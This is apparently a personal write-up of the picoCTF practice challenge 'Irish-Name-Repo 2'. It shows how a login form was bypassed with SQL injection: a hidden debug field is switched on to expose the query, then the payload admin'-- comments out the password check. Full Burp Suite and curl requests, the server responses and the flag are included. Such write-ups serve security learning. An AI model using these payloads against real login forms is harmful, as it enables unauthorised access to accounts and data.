# picoGym Level 59: Irish-Name-Repo 2 🧠
Source: https://play.picoctf.org/practice/challenge/59

## Goal
There is a website running at https://jupiter.challenges.picoctf.org/problem/53751/<br>
Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or<br>
http://jupiter.challenges.picoctf.org:53751

## What I learned
```
SQL Injection

ChatGPT SQL Injection Code: ' OR '1'='1 (Not work this time)
Note: curl most target php not html to send form 🐱‍💻
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username"⭐ class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0"> 👀 debug

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

# Burp Suite: http://jupiter.challenges.picoctf.org:53751/login.html
# debug = 1
# Request
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:53751
Content-Length: 37
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:53751
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:53751/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin&password=admin&debug=1 👀

# Response
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin' 👀
</pre><h1>Login failed.</h1>

# Comment out password
# Request
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:53751
Content-Length: 40
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:53751
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:53751/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin'--&password=admin&debug=1 👀

# Response
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: admin'--
password: admin
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p> 🔐

Method 2: curl
AsianHacker-picoctf@webshell:~$ curl http://jupiter.challenges.picoctf.org:53751/login.html ⌨️
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username"⭐ class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

# Note: curl most target php not html to send form
AsianHacker-picoctf@webshell:~$ curl -v http://jupiter.challenges.picoctf.org:53751/login.php --data "username=admin'--&password=1" ⌨️
*   Trying 3.131.60.8:53751...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 53751 (#0)
> POST /login.php HTTP/1.1
> Host: jupiter.challenges.picoctf.org:53751
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
* Closing connection 0
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p> 🔐
```

## Flag
picoCTF{m0R3_SQL_plz_c34df170}

## Continue
[Continue](./picoGym0008.md)